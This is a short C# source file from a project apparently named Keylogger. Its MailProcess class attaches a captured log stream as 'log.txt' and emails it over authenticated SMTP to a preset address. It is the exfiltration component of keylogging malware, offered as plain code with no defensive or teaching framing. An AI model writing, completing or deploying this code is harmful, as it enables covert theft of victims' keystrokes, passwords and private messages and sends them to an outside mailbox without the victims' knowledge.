using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Mail;
using System.Text;
using System.IO;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

namespace Keylogger
{
    class MailProcess
    {
        public static void SendEmail(Stream file)
        {

            

            using (MailMessage mail = new MailMessage())
            {
                mail.From = new MailAddress(Const.emailFrom);
                mail.To.Add(Const.emailTo);
                mail.Subject = Const.subject;
                mail.Body = Const.body;
                mail.IsBodyHtml = true;
                mail.Attachments.Add(new Attachment(file, "log.txt"));
                SmtpClient smtp = new SmtpClient(Const.smtpAddress, Const.portNumber);

                smtp.Credentials = new NetworkCredential(Const.emailFrom, Const.password);
                smtp.EnableSsl = Const.enableSSL;
                smtp.Send(mail);


            }


        }
    }
}
